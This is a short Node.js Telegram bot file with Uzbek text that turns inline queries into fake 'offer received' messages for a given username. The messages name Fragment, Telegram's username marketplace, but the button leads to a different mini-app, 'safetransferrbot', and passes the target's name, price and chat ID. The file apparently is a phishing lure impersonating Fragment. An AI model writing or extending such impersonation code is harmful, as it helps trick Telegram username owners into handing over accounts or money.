const bot = require("./bot");

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, `Assalomu alaykum, ${msg.from.first_name}!\n\nIltimos, username va summa ko'rinishida taklif yuboring (masalan: @username-1000 yoki username-1000).`);
});

bot.on("inline_query", (query) => {

    const text = query.query;

    console.log(query);

    if (!/^[A-Za-z]+-(?:[1-9]\d|[1-9]\d{2,3}|10000)$/.test(text)) return;

    const match = text.match(/^([A-Za-z]+)-(\d+)$/);
    const name = match[1]
    const price = match[2];

    const params = btoa(JSON.stringify({ name, price, chatId: query.from.id }));
    const message = `@${name} username uchun taklif yuborildi! Tafsilotlarni ko'rish uchun Fragment-ga tashrif buyuring:`

    const results = [
        {
            type: "article",
            id: "1",
            title: message,
            input_message_content: {
                message_text: message,
            },
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "Taklifni ko'rish", url: "https://t.me/safetransferrbot/transfer?startapp=" + params },
                    ],
                ],
            }
        },
    ];
    bot.answerInlineQuery(query.id, results, { cache_time: 0 });
});

module.exports = bot;
